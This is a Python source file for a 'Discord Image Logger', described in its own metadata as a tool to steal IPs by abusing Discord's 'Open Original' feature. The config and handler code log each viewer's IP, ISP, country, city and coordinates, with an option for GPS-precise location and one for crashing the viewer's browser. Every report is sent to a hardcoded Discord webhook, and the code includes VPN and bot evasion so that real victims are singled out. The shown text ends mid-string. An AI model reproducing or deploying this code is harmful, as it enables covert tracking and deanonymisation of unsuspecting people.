# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1149900956281090118/SN-z9unMLZIc2Rtj8_MHiDOvWDuTIkE-9GKIeHcVXkk23rGp-mbi9PE6H_y3WVcPHkMr",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
